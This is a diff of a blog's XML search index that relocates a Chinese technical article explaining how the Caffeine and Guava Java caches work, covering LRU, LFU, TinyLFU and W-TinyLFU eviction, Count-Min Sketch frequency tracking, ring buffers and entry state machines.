@@ -52,6 +52,81 @@
       </tags>
   </entry>
   <entry>
+    <title>caffeine 缓存实现原理</title>
+    <url>/caffeine.html</url>
+    <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们知道 HashMap 可以作为进程内缓存，他不受外部系统影响，速度快。但是他不能像分布式缓存那样能够实时刷新，且本地内存有限，需要限定 HashMap 的容量范围，这就涉及到缓存淘汰问题。为了解决本地缓存的这些问题，Guava Cache 应运而生，他提供了异步刷新和 LRU 淘汰策略。Guava Cache 功能虽然强大，但是只是对 LRU 的一层封装，在复杂的业务场景下，LRU 淘汰策略显得力不从心。为此基于  W-TinyLFU(LFU+LRU算法的变种) 淘汰策略的进程内缓存 —— Caffeine Cache 诞生了。</p>
+<p>Caffeine 的设计实现来自于大量优秀的研究，SpringBoot2 和 Spring5 已经默认支持 Caffeine Cache 代替原来的 Guava Cache，足以见得  Caffeine Cache 的地位。</p>
+<p>本文将试着探究 Guava Cache 和 Caffeine Cache 的实现原理，重点讲解 Caffeine Cache 相比于 Guava Cache 有哪些优秀的设计和改动。本文研究的 caffeine 版本是 2.7.0，guava 版本是 27.1-jre。</p>
+<h2 id="二、缓存淘汰算法"><a href="#二、缓存淘汰算法" class="headerlink" title="二、缓存淘汰算法"></a>二、缓存淘汰算法</h2><p>因为本地内存非常有限，我们的进程内缓存必须是有界的，需要进行数据淘汰，将无效的数据驱逐。一个好的淘汰算法，决定了其命中率高低。下面会简单介绍一些常见的淘汰算法，以便于后续的深入讲解。</p>
+<h3 id="2-1-LFU"><a href="#2-1-LFU" class="headerlink" title="2.1 LFU"></a>2.1 LFU</h3><p>LFU（Least Frequently Used，最近最不常用）根据数据的访问频率，淘汰掉最近访问频率最低的数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。</p>
+<p>需要维护每个数据项的访问频率信息，每次访问都需要更新，这个开销是非常大的。</p>
+<p>LFU 能够很好地应对偶发性、周期性的批量操作，不会造成缓存污染。但是对于突发性的热点事件，比如外卖中午时候访问量突增、微博爆出某明星糗事就是一个突发性热点事件。当事件结束后，可能没有啥访问量了，但是由于其极高的访问频率，导致其在未来很长一段时间内都不会被淘汰掉。</p>
+<h3 id="2-2-LRU"><a href="#2-2-LRU" class="headerlink" title="2.2 LRU"></a>2.2 LRU</h3><p>LRU（Least recently used，最近最少使用）根据数据的访问记录，淘汰掉最近最少使用的数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高”（时间局部性原理）。</p>
+<p>需要用 queue 来保存访问记录，可以用 LinkedHashMap 来简单实现一个基于 LRU 算法的缓存。</p>
+<p>当存在热点数据时，LRU的效率很好。但偶发性的、周期性的批量操作会导致LRU命中率急剧下降，缓存污染情况比较严重。</p>
+<h3 id="2-3-TinyLFU"><a href="#2-3-TinyLFU" class="headerlink" title="2.3 TinyLFU"></a>2.3 TinyLFU</h3><p>TinyLFU 顾名思义，轻量级LFU，相比于 LFU 算法用更小的内存空间来记录访问频率。</p>
+<p>TinyLFU 维护了近期访问记录的频率信息，不同于传统的 LFU 维护整个生命周期的访问记录，所以他可以很好地应对突发性的热点事件（超过一定时间，这些记录不再被维护）。这些访问记录会作为一个过滤器，当新加入的记录（New Item）访问频率高于将被淘汰的缓存记录（Cache Victim）时才会被替换。流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio7.svg?sanitize=true" alt="08c4cfb4641549d3fb651df6d21425c7.png"></p>
+<p>尽管维护的是近期的访问记录，但仍然是非常昂贵的，TinyLFU 通过 Count-Min Sketch 算法来记录频率信息，它占用空间小且误报率低，关于 Count-Min Sketch 算法可以参考论文：<a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">pproximating Data with the Count-Min Data Structure</a></p>
+<h3 id="2-4-W-TinyLFU"><a href="#2-4-W-TinyLFU" class="headerlink" title="2.4 W-TinyLFU"></a>2.4 W-TinyLFU</h3><p>W-TinyLFU 算法相比于 LRU 等算法，具有更高的命中率。下图是一个运行了 ERP 应用的数据库服务中各种算法的命中率，实验数据来源于 ARC 算法作者，更多场景的性能测试参见：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency">官网</a></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/66CBD80A-A07E-48CC-8CA8-19FE4ED688FB.png" alt="fc0df0eba9c3b7485b30d498559d98ac.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Efficiency）</a></p>
+<p>W-TinyLFU 算法是对 TinyLFU算法的优化，能够很好地解决一些稀疏的突发访问元素。在一些数目很少但突发访问量很大的场景下，TinyLFU将无法保存这类元素，因为它们无法在短时间内积累到足够高的频率，从而被过滤器过滤掉。W-TinyLFU 将新记录暂时放入 Window Cache 里面，只有通过 TinLFU 考察才能进入 Main Cache。大致流程如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio8.svg?sanitize=true" alt="394b28c7e161703b4630108f894f9ece.png"></p>
+<h2 id="三、缓存事务"><a href="#三、缓存事务" class="headerlink" title="三、缓存事务"></a>三、缓存事务</h2><p>为了实现缓存的过期策略，我们需要在访问数据的时候记录一系列信息，我们将该操作定义为<strong>缓存事务</strong>。</p>
+<p>对于一个实现了写后过期的缓存，需要在其 put 操作时，记录 entry 的写时间，后续通过这个 entry 写时间来判断其是否过期。对于一个实现了读后过期的缓存，需要在其 get 操作时记录 entry 的最后访问时间，后续通过 entry 的最后访问时间来判断其是否过期。对于一个实现了 LFU 淘汰策略的缓存，需要在每次 get 操作时记录 entry 的访问次数，后续通过 entry 的访问次数来判断其是否淘汰。为了便于后续的表述，对于这种为实现缓存的过期淘汰策略而做的一系列额外操作，我们将其定义为<strong>缓存事务</strong>。</p>
+<h2 id="四、guava-缓存"><a href="#四、guava-缓存" class="headerlink" title="四、guava 缓存"></a>四、guava 缓存</h2><p>guava 缓存提供了基于容量、时间、引用的过期策略。基于容量的实现是采用 LRU 算法。基于引用的实现是借助于 JVM GC，因为缓存的key被封装在WeakReference引用内，缓存的Value被封装在WeakReference或SoftReference引用内。</p>
+<p>为了减少读写缓存的并发问题，参考了 JDK1.7 版本的 ConcurrentHashMap，实现了分段锁机制来减少锁粒度。然而分段锁机制不是非常好的方案，JDK1.8 已经取消了 ConcurrentHashMap 的分段锁，采用的 CAS + synchronized，他只锁住数组的单个元素。关于 ConcurrentHashMap 在 JDK1.8  中的改进，这里不再展开。</p>
+<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。其中 recencyQueue 是记录 get 操作命中的，accessQueue 是记录 get 操作未命中的。recencyQueue 是无锁操作，需要保证线程安全。  值得注意的是，在高并发下，queue的竞争是比较激烈，guava 是在 每个 put/get 操作时记录到对应的 queue，这样增加了用户端的耗时。</p>
+<p>过期策略是在访问数据的时候，判断是否过期。这样做好处是不需要后台线程定期扫描，但增加了耗时和内存损耗（本该过期的数据没有及时过期）。</p>
+<h3 id="4-1-Guava-缓存的执行流程"><a href="#4-1-Guava-缓存的执行流程" class="headerlink" title="4.1 Guava 缓存的执行流程"></a>4.1 Guava 缓存的执行流程</h3><p>guava 的事务操作是在读取缓存时一起执行的，读取缓存操作流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio9.svg?sanitize=true" alt="ec637600e0c6833c9b23076f48e3487a.png"></p>
+<p>事务处理在读取缓存时同步进行，这样的好处是不需要后台线程定期扫描处理事务，保证数据的实时性，但会增加一定的耗时。</p>
+<h3 id="4-2-Guava-缓存中的事务处理"><a href="#4-2-Guava-缓存中的事务处理" class="headerlink" title="4.2 Guava 缓存中的事务处理"></a>4.2 Guava 缓存中的事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio10.svg?sanitize=true" alt="bbd76bb898c0e572a12de5d4ba0c2c37.png"></p>
+<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。用来实现不同情况的 LRU 淘汰策略。其中 recencyQueue 是<strong>记录 get 命中操作的</strong>，这是个多线程操作，Guava 通过线程安全的 recencyQueue 来记录，然后通过单线程批量 recencyQueue 将访问记录添加到非线程安全的 accessQueue，可以看出 recencyQueue <strong>起到缓冲的作用</strong>。  正因为 recencyQueue 是线程安全的，在 get 操作时又增加了并发竞争耗时（将 Entry 添加到 recencyQueue）。</p>
+<h2 id="五、caffeine-缓存"><a href="#五、caffeine-缓存" class="headerlink" title="五、caffeine 缓存"></a>五、caffeine 缓存</h2><p>相比于 Guava 缓存，采用了更加先进的过期策略 W-TinyLFU，通过 RingBuffer 缓存事务，并用后台进程批量处理事务。Caffeine 直接采用的是 ConcurrentHashMap，要知道 ConcurrentHashMap 在 JDK1.8 是有非常大的性能提升的。</p>
+<p>简单讲，Caffeine 是对 ConcurrentHashMap 进行封装，采用缓冲和后台线程批量处理事务，Caffeine 官方称其并发性能近视等于 ConcurrentHashMap。</p>
+<p>Caffeine 官方做了性能测试，其中 6 线程读 2 线程写吞吐量如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/7B9BF947-6252-46E6-B0B5-77DE828AD6FE.png" alt="f9487f4ff3617d4f5c8c80f3186cf8e8.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Benchmarks）</a></p>
+<p>可以看到 Caffeine 缓存吞吐量远超 Guava 缓存，其余场景性能测试详见：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks">官网</a></p>
+<h3 id="5-1-基于-W-TinyLFU"><a href="#5-1-基于-W-TinyLFU" class="headerlink" title="5.1 基于 W-TinyLFU"></a>5.1 基于 W-TinyLFU</h3><p>前面已经提到了 W-TinyLFU 算法，Caffeine 采用 W-TinyLFU 算法来实现其淘汰策略。Caffeine 内部维护了三个 queue，分别为：</p>
+<ul>
+<li>access order queue，实现读后过期</li>
+<li>write order queue，实现写后过期</li>
+<li>Hierarchical TimerWheel，实现定时过期</li>
+</ul>
+<p>在大多数情况下，读操作远比写操作多，因此 Caffeine 为了提高读并发能力，采用分段策略，将 access order queue 分为三种，分别是 WindowDeque、ProbationDeque、ProtectedDeque。这三者关系如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio11.svg?sanitize=true" alt="d5044eb799b261357b0a4ce8f762989b.png"></p>
+<p>结合 W-TinyLFU 算法，可以得出记录从产生到淘汰的整个流程：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/57F8E049-C5CE-4538-A6C0-9F9D071D7BF7.png" alt="f575ccd5c3ee35ca692a41ee0faa5505.png"><br>（图片来源于：<a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html%EF%BC%89">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html）</a></p>
+<p>新的记录会进入第一个 LRU，这个在 Caffeine 里是 WindowDeque。之后通过过滤器过滤，过滤器通过访问频率来实现过滤，只有高于将要淘汰数据的使用频率才能进入缓存。这个频率信息维护就是前面提到的 Count-Min Sketch 算法来实现的，具体是 FrequencySketch 类。</p>
+<h4 id="5-1-1-过期策略"><a href="#5-1-1-过期策略" class="headerlink" title="5.1.1 过期策略"></a>5.1.1 过期策略</h4><p>Caffeine 采用统一的过期时间，这样可以实现 O(1) 复杂度往队列里添加和取出记录。对于写后过期，维护一个写入顺序队列，对于读后过期，维护一个读顺序队列。值得注意的是，这些操作都是单线程异步执行的。</p>
+<h3 id="5-2-执行流程"><a href="#5-2-执行流程" class="headerlink" title="5.2 执行流程"></a>5.2 执行流程</h3><p>与 Guava 最大的不同就是，Caffeine 在读取缓存操作时，将<strong>事务提交到缓存异步批量处理</strong>，大致处理流程如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio12.svg?sanitize=true" alt="a90c9c637a6b76cf46f13d01815bcd86.png"></p>
+<h3 id="5-3-缓存区"><a href="#5-3-缓存区" class="headerlink" title="5.3 缓存区"></a>5.3 缓存区</h3><h4 id="5-3-1-readBuffer"><a href="#5-3-1-readBuffer" class="headerlink" title="5.3.1 readBuffer"></a>5.3.1 readBuffer</h4><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio13.svg?sanitize=true" alt="36ba91e8ba3b79918b10cdf7b9d17082.png"></p>
+<p>采用RingBuffer，有损。为了进一步减少读并发，采用多个 RingBuffer（striped ring buffer 条带环形缓冲），通过线程 id 哈希到对应的RingBuffer。环形缓存的一个显著特点是不需要进行 GC，直接通过覆盖过期数据。</p>
+<p>当一个 RingBuffer 容量满载后，会触发异步的执行操作，而后续的对该 ring buffer 的写入会被丢弃，直到这个 ring buffer 可被使用，因此 readBuffer 记录读缓存事务是有损的。因为读记录是为了优化驱策策略，允许他有损。</p>
+<h4 id="5-3-2-writeBuffer"><a href="#5-3-2-writeBuffer" class="headerlink" title="5.3.2 writeBuffer"></a>5.3.2 writeBuffer</h4><p>采用传统的有界队列 ArrayQueue，无损</p>
+<h3 id="5-4-状态机"><a href="#5-4-状态机" class="headerlink" title="5.4 状态机"></a>5.4 状态机</h3><p>缓冲区和细粒度的写带来了单个数据项的操作乱序的竞态条件。插入、读取、更新、删除都可能被各种顺序的重放，如果这个策略控制的不合适，则可能引起悬垂索引。解决方案是通过状态机来定义单个数据项的生命周期。这类似于 AQS 中的原子类型变量 state。</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio14.svg?sanitize=true" alt="7744cc0f1faa13cb71a53c2033fe495c.png"></p>
+<h3 id="5-5-事务处理"><a href="#5-5-事务处理" class="headerlink" title="5.5 事务处理"></a>5.5 事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio15.svg?sanitize=true" alt="4aa939e0c2bfc37f2463823eeeca80d7.png"></p>
+<h3 id="5-6-caffeine-get-操作流程图"><a href="#5-6-caffeine-get-操作流程图" class="headerlink" title="5.6 caffeine get 操作流程图"></a>5.6 caffeine get 操作流程图</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio16.svg?sanitize=true" alt="f07e7f28159908d5899cb36643be3c46.png"></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio17.svg?sanitize=true" alt="4fe5bac0356b7e0baf8f181938b1bcde.png"></p>
+<h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p><a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html</a></p>
+<p><a href="https://github.com/ben-manes/caffeine">https://github.com/ben-manes/caffeine</a></p>
+<p><a href="https://arxiv.org/pdf/1512.00727.pdf">TinyLFU: A Highly Eﬃcient Cache Admission Policy</a></p>
+<p><a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">Approximating Data with the Count-Min Data Structure</a></p>
+<p><a href="https://segmentfault.com/a/1190000016091569">https://segmentfault.com/a/1190000016091569</a></p>
+<p><a href="https://chuansongme.com/n/2254051">https://chuansongme.com/n/2254051</a></p>
+]]></content>
+      <categories>
+        <category>javaWeb</category>
+      </categories>
+      <tags>
+        <tag>源码</tag>
+        <tag>caffeine</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ddd-overview</title>
     <url>/ddd-overview.html</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
@@ -134,81 +209,6 @@
       </categories>
       <tags>
         <tag>ddd</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>caffeine 缓存实现原理</title>
-    <url>/caffeine.html</url>
-    <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们知道 HashMap 可以作为进程内缓存，他不受外部系统影响，速度快。但是他不能像分布式缓存那样能够实时刷新，且本地内存有限，需要限定 HashMap 的容量范围，这就涉及到缓存淘汰问题。为了解决本地缓存的这些问题，Guava Cache 应运而生，他提供了异步刷新和 LRU 淘汰策略。Guava Cache 功能虽然强大，但是只是对 LRU 的一层封装，在复杂的业务场景下，LRU 淘汰策略显得力不从心。为此基于  W-TinyLFU(LFU+LRU算法的变种) 淘汰策略的进程内缓存 —— Caffeine Cache 诞生了。</p>
-<p>Caffeine 的设计实现来自于大量优秀的研究，SpringBoot2 和 Spring5 已经默认支持 Caffeine Cache 代替原来的 Guava Cache，足以见得  Caffeine Cache 的地位。</p>
-<p>本文将试着探究 Guava Cache 和 Caffeine Cache 的实现原理，重点讲解 Caffeine Cache 相比于 Guava Cache 有哪些优秀的设计和改动。本文研究的 caffeine 版本是 2.7.0，guava 版本是 27.1-jre。</p>
-<h2 id="二、缓存淘汰算法"><a href="#二、缓存淘汰算法" class="headerlink" title="二、缓存淘汰算法"></a>二、缓存淘汰算法</h2><p>因为本地内存非常有限，我们的进程内缓存必须是有界的，需要进行数据淘汰，将无效的数据驱逐。一个好的淘汰算法，决定了其命中率高低。下面会简单介绍一些常见的淘汰算法，以便于后续的深入讲解。</p>
-<h3 id="2-1-LFU"><a href="#2-1-LFU" class="headerlink" title="2.1 LFU"></a>2.1 LFU</h3><p>LFU（Least Frequently Used，最近最不常用）根据数据的访问频率，淘汰掉最近访问频率最低的数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。</p>
-<p>需要维护每个数据项的访问频率信息，每次访问都需要更新，这个开销是非常大的。</p>
-<p>LFU 能够很好地应对偶发性、周期性的批量操作，不会造成缓存污染。但是对于突发性的热点事件，比如外卖中午时候访问量突增、微博爆出某明星糗事就是一个突发性热点事件。当事件结束后，可能没有啥访问量了，但是由于其极高的访问频率，导致其在未来很长一段时间内都不会被淘汰掉。</p>
-<h3 id="2-2-LRU"><a href="#2-2-LRU" class="headerlink" title="2.2 LRU"></a>2.2 LRU</h3><p>LRU（Least recently used，最近最少使用）根据数据的访问记录，淘汰掉最近最少使用的数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高”（时间局部性原理）。</p>
-<p>需要用 queue 来保存访问记录，可以用 LinkedHashMap 来简单实现一个基于 LRU 算法的缓存。</p>
-<p>当存在热点数据时，LRU的效率很好。但偶发性的、周期性的批量操作会导致LRU命中率急剧下降，缓存污染情况比较严重。</p>
-<h3 id="2-3-TinyLFU"><a href="#2-3-TinyLFU" class="headerlink" title="2.3 TinyLFU"></a>2.3 TinyLFU</h3><p>TinyLFU 顾名思义，轻量级LFU，相比于 LFU 算法用更小的内存空间来记录访问频率。</p>
-<p>TinyLFU 维护了近期访问记录的频率信息，不同于传统的 LFU 维护整个生命周期的访问记录，所以他可以很好地应对突发性的热点事件（超过一定时间，这些记录不再被维护）。这些访问记录会作为一个过滤器，当新加入的记录（New Item）访问频率高于将被淘汰的缓存记录（Cache Victim）时才会被替换。流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio7.svg?sanitize=true" alt="08c4cfb4641549d3fb651df6d21425c7.png"></p>
-<p>尽管维护的是近期的访问记录，但仍然是非常昂贵的，TinyLFU 通过 Count-Min Sketch 算法来记录频率信息，它占用空间小且误报率低，关于 Count-Min Sketch 算法可以参考论文：<a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">pproximating Data with the Count-Min Data Structure</a></p>
-<h3 id="2-4-W-TinyLFU"><a href="#2-4-W-TinyLFU" class="headerlink" title="2.4 W-TinyLFU"></a>2.4 W-TinyLFU</h3><p>W-TinyLFU 算法相比于 LRU 等算法，具有更高的命中率。下图是一个运行了 ERP 应用的数据库服务中各种算法的命中率，实验数据来源于 ARC 算法作者，更多场景的性能测试参见：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency">官网</a></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/66CBD80A-A07E-48CC-8CA8-19FE4ED688FB.png" alt="fc0df0eba9c3b7485b30d498559d98ac.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Efficiency）</a></p>
-<p>W-TinyLFU 算法是对 TinyLFU算法的优化，能够很好地解决一些稀疏的突发访问元素。在一些数目很少但突发访问量很大的场景下，TinyLFU将无法保存这类元素，因为它们无法在短时间内积累到足够高的频率，从而被过滤器过滤掉。W-TinyLFU 将新记录暂时放入 Window Cache 里面，只有通过 TinLFU 考察才能进入 Main Cache。大致流程如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio8.svg?sanitize=true" alt="394b28c7e161703b4630108f894f9ece.png"></p>
-<h2 id="三、缓存事务"><a href="#三、缓存事务" class="headerlink" title="三、缓存事务"></a>三、缓存事务</h2><p>为了实现缓存的过期策略，我们需要在访问数据的时候记录一系列信息，我们将该操作定义为<strong>缓存事务</strong>。</p>
-<p>对于一个实现了写后过期的缓存，需要在其 put 操作时，记录 entry 的写时间，后续通过这个 entry 写时间来判断其是否过期。对于一个实现了读后过期的缓存，需要在其 get 操作时记录 entry 的最后访问时间，后续通过 entry 的最后访问时间来判断其是否过期。对于一个实现了 LFU 淘汰策略的缓存，需要在每次 get 操作时记录 entry 的访问次数，后续通过 entry 的访问次数来判断其是否淘汰。为了便于后续的表述，对于这种为实现缓存的过期淘汰策略而做的一系列额外操作，我们将其定义为<strong>缓存事务</strong>。</p>
-<h2 id="四、guava-缓存"><a href="#四、guava-缓存" class="headerlink" title="四、guava 缓存"></a>四、guava 缓存</h2><p>guava 缓存提供了基于容量、时间、引用的过期策略。基于容量的实现是采用 LRU 算法。基于引用的实现是借助于 JVM GC，因为缓存的key被封装在WeakReference引用内，缓存的Value被封装在WeakReference或SoftReference引用内。</p>
-<p>为了减少读写缓存的并发问题，参考了 JDK1.7 版本的 ConcurrentHashMap，实现了分段锁机制来减少锁粒度。然而分段锁机制不是非常好的方案，JDK1.8 已经取消了 ConcurrentHashMap 的分段锁，采用的 CAS + synchronized，他只锁住数组的单个元素。关于 ConcurrentHashMap 在 JDK1.8  中的改进，这里不再展开。</p>
-<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。其中 recencyQueue 是记录 get 操作命中的，accessQueue 是记录 get 操作未命中的。recencyQueue 是无锁操作，需要保证线程安全。  值得注意的是，在高并发下，queue的竞争是比较激烈，guava 是在 每个 put/get 操作时记录到对应的 queue，这样增加了用户端的耗时。</p>
-<p>过期策略是在访问数据的时候，判断是否过期。这样做好处是不需要后台线程定期扫描，但增加了耗时和内存损耗（本该过期的数据没有及时过期）。</p>
-<h3 id="4-1-Guava-缓存的执行流程"><a href="#4-1-Guava-缓存的执行流程" class="headerlink" title="4.1 Guava 缓存的执行流程"></a>4.1 Guava 缓存的执行流程</h3><p>guava 的事务操作是在读取缓存时一起执行的，读取缓存操作流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio9.svg?sanitize=true" alt="ec637600e0c6833c9b23076f48e3487a.png"></p>
-<p>事务处理在读取缓存时同步进行，这样的好处是不需要后台线程定期扫描处理事务，保证数据的实时性，但会增加一定的耗时。</p>
-<h3 id="4-2-Guava-缓存中的事务处理"><a href="#4-2-Guava-缓存中的事务处理" class="headerlink" title="4.2 Guava 缓存中的事务处理"></a>4.2 Guava 缓存中的事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio10.svg?sanitize=true" alt="bbd76bb898c0e572a12de5d4ba0c2c37.png"></p>
-<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。用来实现不同情况的 LRU 淘汰策略。其中 recencyQueue 是<strong>记录 get 命中操作的</strong>，这是个多线程操作，Guava 通过线程安全的 recencyQueue 来记录，然后通过单线程批量 recencyQueue 将访问记录添加到非线程安全的 accessQueue，可以看出 recencyQueue <strong>起到缓冲的作用</strong>。  正因为 recencyQueue 是线程安全的，在 get 操作时又增加了并发竞争耗时（将 Entry 添加到 recencyQueue）。</p>
-<h2 id="五、caffeine-缓存"><a href="#五、caffeine-缓存" class="headerlink" title="五、caffeine 缓存"></a>五、caffeine 缓存</h2><p>相比于 Guava 缓存，采用了更加先进的过期策略 W-TinyLFU，通过 RingBuffer 缓存事务，并用后台进程批量处理事务。Caffeine 直接采用的是 ConcurrentHashMap，要知道 ConcurrentHashMap 在 JDK1.8 是有非常大的性能提升的。</p>
-<p>简单讲，Caffeine 是对 ConcurrentHashMap 进行封装，采用缓冲和后台线程批量处理事务，Caffeine 官方称其并发性能近视等于 ConcurrentHashMap。</p>
-<p>Caffeine 官方做了性能测试，其中 6 线程读 2 线程写吞吐量如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/7B9BF947-6252-46E6-B0B5-77DE828AD6FE.png" alt="f9487f4ff3617d4f5c8c80f3186cf8e8.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Benchmarks）</a></p>
-<p>可以看到 Caffeine 缓存吞吐量远超 Guava 缓存，其余场景性能测试详见：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks">官网</a></p>
-<h3 id="5-1-基于-W-TinyLFU"><a href="#5-1-基于-W-TinyLFU" class="headerlink" title="5.1 基于 W-TinyLFU"></a>5.1 基于 W-TinyLFU</h3><p>前面已经提到了 W-TinyLFU 算法，Caffeine 采用 W-TinyLFU 算法来实现其淘汰策略。Caffeine 内部维护了三个 queue，分别为：</p>
-<ul>
-<li>access order queue，实现读后过期</li>
-<li>write order queue，实现写后过期</li>
-<li>Hierarchical TimerWheel，实现定时过期</li>
-</ul>
-<p>在大多数情况下，读操作远比写操作多，因此 Caffeine 为了提高读并发能力，采用分段策略，将 access order queue 分为三种，分别是 WindowDeque、ProbationDeque、ProtectedDeque。这三者关系如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio11.svg?sanitize=true" alt="d5044eb799b261357b0a4ce8f762989b.png"></p>
-<p>结合 W-TinyLFU 算法，可以得出记录从产生到淘汰的整个流程：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/57F8E049-C5CE-4538-A6C0-9F9D071D7BF7.png" alt="f575ccd5c3ee35ca692a41ee0faa5505.png"><br>（图片来源于：<a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html%EF%BC%89">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html）</a></p>
-<p>新的记录会进入第一个 LRU，这个在 Caffeine 里是 WindowDeque。之后通过过滤器过滤，过滤器通过访问频率来实现过滤，只有高于将要淘汰数据的使用频率才能进入缓存。这个频率信息维护就是前面提到的 Count-Min Sketch 算法来实现的，具体是 FrequencySketch 类。</p>
-<h4 id="5-1-1-过期策略"><a href="#5-1-1-过期策略" class="headerlink" title="5.1.1 过期策略"></a>5.1.1 过期策略</h4><p>Caffeine 采用统一的过期时间，这样可以实现 O(1) 复杂度往队列里添加和取出记录。对于写后过期，维护一个写入顺序队列，对于读后过期，维护一个读顺序队列。值得注意的是，这些操作都是单线程异步执行的。</p>
-<h3 id="5-2-执行流程"><a href="#5-2-执行流程" class="headerlink" title="5.2 执行流程"></a>5.2 执行流程</h3><p>与 Guava 最大的不同就是，Caffeine 在读取缓存操作时，将<strong>事务提交到缓存异步批量处理</strong>，大致处理流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio12.svg?sanitize=true" alt="a90c9c637a6b76cf46f13d01815bcd86.png"></p>
-<h3 id="5-3-缓存区"><a href="#5-3-缓存区" class="headerlink" title="5.3 缓存区"></a>5.3 缓存区</h3><h4 id="5-3-1-readBuffer"><a href="#5-3-1-readBuffer" class="headerlink" title="5.3.1 readBuffer"></a>5.3.1 readBuffer</h4><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio13.svg?sanitize=true" alt="36ba91e8ba3b79918b10cdf7b9d17082.png"></p>
-<p>采用RingBuffer，有损。为了进一步减少读并发，采用多个 RingBuffer（striped ring buffer 条带环形缓冲），通过线程 id 哈希到对应的RingBuffer。环形缓存的一个显著特点是不需要进行 GC，直接通过覆盖过期数据。</p>
-<p>当一个 RingBuffer 容量满载后，会触发异步的执行操作，而后续的对该 ring buffer 的写入会被丢弃，直到这个 ring buffer 可被使用，因此 readBuffer 记录读缓存事务是有损的。因为读记录是为了优化驱策策略，允许他有损。</p>
-<h4 id="5-3-2-writeBuffer"><a href="#5-3-2-writeBuffer" class="headerlink" title="5.3.2 writeBuffer"></a>5.3.2 writeBuffer</h4><p>采用传统的有界队列 ArrayQueue，无损</p>
